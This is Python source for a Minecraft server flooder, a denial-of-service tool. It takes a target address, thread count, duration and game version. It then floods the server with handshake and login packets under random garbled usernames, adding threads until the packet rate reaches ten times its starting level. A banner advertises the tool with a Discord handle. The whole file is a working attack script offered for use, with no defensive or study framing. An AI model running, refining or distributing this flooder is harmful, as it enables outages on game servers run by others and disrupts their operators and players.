import sys, socket, threading, time, random, requests, os
from struct import pack as p
from colorama import Fore, init
init(autoreset=True)

sent_packets = 0
fail_packets = 0
pps = 0
mbps = 0.0
lock = threading.Lock()
pps_lock = threading.Lock()

USR = "̸̧̡̡̛̹̝̤̲̯̗̣̪̣͇̻̲̃͑ͨ̽͋̆ͦ̃̇̒ͭ͢͞͡ͅ‭"
VER = {
    "1.0.0": 22, "1.1.0": 23, "1.2.2": 28, "1.2.4": 29, "1.3.1": 39, "1.4.2": 47,
    "1.4.3": 48, "1.4.4": 49, "1.4.6": 51, "1.5.0": 60, "1.5.2": 61, "1.6.0": 72,
    "1.6.1": 73, "1.6.2": 74, "1.6.4": 78, "1.7.1": 4, "1.7.6": 5, "1.8.0": 47,
    "1.9.0": 107, "1.9.2": 109, "1.9.4": 110, "1.10.0": 210, "1.11.0": 315,
    "1.11.1": 316, "1.12.0": 335, "1.12.1": 338, "1.12.2": 340, "1.13.0": 393,
    "1.13.1": 401, "1.13.2": 404, "1.14.0": 477, "1.14.1": 480, "1.14.2": 485,
    "1.14.3": 490, "1.14.4": 498, "1.15.0": 573, "1.15.1": 575, "1.15.2": 578,
    "1.16.0": 735, "1.16.1": 736, "1.16.2": 751, "1.16.3": 753, "1.16.4": 754,
    "1.16.5": 754, "1.17.0": 755, "1.17.1": 756, "1.18.0": 757, "1.18.1": 757,
    "1.18.2": 758, "1.19.0": 759, "1.19.1": 760, "1.19.2": 760, "1.19.3": 761,
    "1.19.4": 762, "1.20.0": 763, "1.20.2": 764, "1.20.3": 765, "1.20.4": 765,
    "1.20.5": 766, "1.21": 767, "1.21.1": 767, "1.21.2": 768, "1.21.4": 769,
    "1.21.5": 770, "1.21.6": 771, "1.21.7": 772, "1.21.8": 772
}

box_lines = [
    " _____  _____   _________        __        ___  ____                      ",
    "|_   _||_   _| |_   ___  |      /  \\      |_  ||_  _|                    ",
    "  | | /\\ | |     | |_  \\_|     / /\\ \\       | |_/ /                   ",
    "  | |/  \\| |     |  _|  _     / ____ \\      |  __'.                     ",
    "  |   /\\   |    _| |___/ |  _/ /    \\ \\_   _| |  \\ \\_  _             ",
    "  |__/  \\__|   |_________| |____|  |____| |____||____|(_)                ",
    "═══════════════╦═════════════════════╦══════════════════                  ",
    "               ║                     ║                                    ",
    "           ╔═══╩═════════════════════╩════════╗                           ",
    "           ║    STAND AND DONT FALL BACK.     ║                           ",
    "           ╠══════════════════════════════════╣                           ",
    "           ║ Minecraft HandshakeLogin Flooder ║                           ",
    "           ╠══════════════════════════════════╣                           ",
    "           ║     DC: anpersonthatperson       ║                           ",
    "           ╚══════════════════════════════════╝                           ",
]

def interpolate_color(c1, c2, t):
    return tuple(int(c1[i] + (c2[i] - c1[i]) * t) for i in range(3))

def vertical_gradient_text(lines, colorss):
    n = len(lines)
    segs = len(colorss) - 1
    seg_length = n / segs
    output = []
    for i, line in enumerate(lines):
        seg_index = min(int(i // seg_length), segs - 1)
        t = (i - seg_index * seg_length) / seg_length
        r, g, b = interpolate_color(colorss[seg_index], colorss[seg_index + 1], t)
        output.append(f"\033[38;2;{r};{g};{b}m{line}\033[0m")
    return output

blue = (0, 0, 139)
cyan = (0, 255, 255)
white = (255, 255, 255)
colorss = [white, cyan, blue]
gradient_lines = vertical_gradient_text(box_lines, colorss)

def vi(n):
    out = []
    while True:
        b = n & 0x7F
        n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n:
            break
    return bytes(out)

def encode_packet(*args): return vi(len(b''.join(args))) + b''.join(args)
def short(port): return p(">H", port)
def handshake_packet(ip, port, proto): return encode_packet(vi(0x00), vi(proto), encode_packet(ip.encode()), short(port), vi(2))
def login_packet(proto, username): return encode_packet(vi(0x00), encode_packet(username)) if proto >= 391 else encode_packet(vi(0x01), encode_packet(username))
def generate_username():
    return (USR + str(random.randint(1000, 9999))).encode('utf-8')

def check_server_online_via_api(ip, port):
    if ip == "127.0.0.1": return True
    try:
        res = requests.get(f"https://api.mcsrvstat.us/3/{ip}:{port}", timeout=5).json()
        return res.get("online", False)
    except: return False

def send_handshake_and_login(ip, port, proto):
    global sent_packets, fail_packets, pps, mbps
    thread_id = threading.get_ident()
    for _ in range(5):
        try:
            s = socket.socket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((ip, port))
            uname = generate_username()
            handshake = handshake_packet(ip, port, proto)
            login = login_packet(proto, uname)
            s.sendall(handshake)
            s.sendall(login)
            try:
                data = s.recv(1024)
                if data:
                    with lock: sent_packets += 2
                    with pps_lock:
                        pps += 2
                        mbps += (len(handshake) + len(login)) / (1024 * 1024)
                else:
                    with lock: fail_packets += 1
            except socket.timeout:
                with lock: fail_packets += 1
            try: s.shutdown(socket.SHUT_RDWR)
            except: pass
            s.close()
            return
        except Exception as e:
            with lock: fail_packets += 1
            if "104" in str(e): print(Fore.RED + f"[Thread {thread_id}] Connection reset by peer", flush=True)
            else: print(Fore.RED + f"[Thread {thread_id}] {e}", flush=True)
            time.sleep(0.05)

def spammer(ip, port, proto, end_time):
    while time.time() < end_time:
        send_handshake_and_login(ip, port, proto)
        time.sleep(0.01)

def monitor(end_time, initial_threads, ip, port, proto):
    global pps, mbps
    baseline_pps = None
    target_pps = None
    active_threads = initial_threads
    last_increase = time.time()

    while time.time() < end_time:
        time.sleep(1)
        with pps_lock:
            now_pps = pps
            now_mbps = mbps
            pps = 0
            mbps = 0.0

        if baseline_pps is None and now_pps > 0:
            baseline_pps = now_pps
            target_pps = baseline_pps * 10
            print(Fore.MAGENTA + f"\n[!] Baseline PPS = {baseline_pps}, Target = {target_pps}", flush=True)

        if baseline_pps and now_pps < target_pps and time.time() - last_increase > 2:
            threading.Thread(target=spammer, args=(ip, port, proto, end_time), daemon=True).start()
            active_threads += 1
            print(Fore.LIGHTBLUE_EX + f"\n[+] Increased threads to {active_threads}", flush=True)
            last_increase = time.time()

        print(f"\r{Fore.YELLOW}[PPS] {now_pps:<6} | [MBPS] {now_mbps:.2f} MB/s | {Fore.CYAN}Total Sent: {sent_packets:<7}", end='', flush=True)

def clear(): os.system('cls' if os.name == 'nt' else 'clear')

def main():
    global sent_packets, fail_packets, pps, mbps
    clear()
    for line in gradient_lines: print(line)
    if len(sys.argv) >= 5:
        target = sys.argv[1]
        threads = int(sys.argv[2])
        duration = int(sys.argv[3])
        version = sys.argv[4]
    else:
        target = input("Target [IP:PORT]: ")
        threads = int(input("Threads (max 100): "))
        duration = int(input("Duration (sec): "))
        version = input("Version: ")
    if version not in VER:
        print("Unsupported version."); return
    proto = VER[version]
    if ':' in target:
        ip, port = target.split(':'); port = int(port)
    else:
        ip = target; port = 25565
    if not check_server_online_via_api(ip, port):
        print("Server offline. Exiting."); return
    print(Fore.GREEN + f"[*] Starting attack on {ip}:{port} for {duration}s with {threads} threads.")
    stop_time = time.time() + duration
    threading.Thread(target=monitor, args=(stop_time, threads, ip, port, proto), daemon=True).start()
    for _ in range(threads):
        threading.Thread(target=spammer, args=(ip, port, proto, stop_time), daemon=True).start()
    while time.time() < stop_time: time.sleep(0.2)
    print(Fore.GREEN + "\n[*] Attack Finished")
    print(Fore.CYAN + f"Sent: {sent_packets}")
    print(Fore.RED + f"Failed: {fail_packets}")

if __name__ == "__main__":
    main()
